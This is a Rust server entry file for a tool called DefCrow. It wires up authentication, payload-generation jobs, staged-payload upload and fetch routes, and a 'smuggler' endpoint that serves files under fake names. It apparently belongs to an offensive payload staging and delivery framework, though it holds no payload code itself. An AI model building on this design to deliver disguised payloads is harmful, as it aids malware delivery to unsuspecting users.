use web_server::{api, builder, config, middleware, state, ws};
use axum::{middleware as axum_mw, routing::{delete, get, post}, Router};
use tower_http::{cors::CorsLayer, services::ServeDir};
use tracing_subscriber::EnvFilter;
use rand::Rng;
use std::path::PathBuf;

use builder::{job_store::JobStore, scaffold::build_scaffold_rlib};
use config::Config;
use middleware::auth::{LoginRateLimiter, require_auth, SessionStore};
use state::AppState;

pub fn build_router(state: AppState) -> Router {
    let stage_authed = Router::new()
        .route("/api/v1/stage",           post(api::stage::upload_stage))
        .route("/api/v1/stage",           get(api::stage::list_stages))
        .route("/api/v1/stage/:pid",      delete(api::stage::delete_stage))
        .route("/api/v1/stage/:pid/token", post(api::stage::rotate_token))
        .route_layer(axum_mw::from_fn_with_state(state.clone(), require_auth));

    let protected = Router::new()
        .route("/api/generate",        post(api::generate::generate))
        .route("/api/jobs/:id",        get(api::jobs::get_job_status))
        .route("/api/jobs/:id",        delete(api::jobs::delete_job))
        .route("/api/download/:id",    get(api::download::download_artifact))
        .route("/api/v1/smug",         post(api::smuggler::create_smug))
        .route_layer(axum_mw::from_fn_with_state(state.clone(), require_auth));

    Router::new()
        .route("/api/auth/login",        post(api::auth::login))
        .route("/api/auth/logout",       post(api::auth::logout))
        .route("/api/health",            get(|| async { "ok" }))
        .route("/ws/jobs/:id",           get(ws::progress::ws_job_progress))
        // Stage fetch uses Bearer JWT — no session cookie required
        .route("/api/v1/stage/:pid",     get(api::stage::fetch_stage))
        .route("/d/:link_id/:fake_name", get(api::smuggler::serve_smug))
        .merge(stage_authed)
        .merge(protected)
        .fallback_service(ServeDir::new("frontend/dist"))
        .with_state(state)
        .layer(CorsLayer::permissive())
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .init();

    let mut cfg = Config::from_env().expect("failed to load config");

    let workspace = std::env::var("DEFCROW_WORKSPACE").unwrap_or_else(|_| ".".into());
    let rlib = build_scaffold_rlib(&workspace).expect("failed to build libscaffold.rlib");
    cfg.scaffold_rlib = rlib;

    let staged_dir = PathBuf::from(&cfg.artifacts_dir).join("staged");
    std::fs::create_dir_all(&staged_dir).expect("failed to create staged dir");

    let smuggler_dir = PathBuf::from(&cfg.artifacts_dir).join("smuggler");
    std::fs::create_dir_all(&smuggler_dir).expect("failed to create smuggler dir");

    let staged_key: [u8; 32] = rand::thread_rng().gen();

    let state = AppState {
        config:           cfg.clone(),
        sessions:         SessionStore::new(),
        jobs:             JobStore::new(),
        rate_limiter:     LoginRateLimiter::new(5, 60),
        generate_limiter: LoginRateLimiter::new(20, 60),
        staged_key,
        staged_dir,
        smuggler_dir,
    };

    web_server::api::cleanup::spawn_cleanup_task(cfg.artifacts_dir.clone());

    let addr = format!("0.0.0.0:{}", cfg.port);
    let app  = build_router(state);

    tracing::info!("DefCrow server listening on {}", addr);
    let listener = tokio::net::TcpListener::bind(&addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
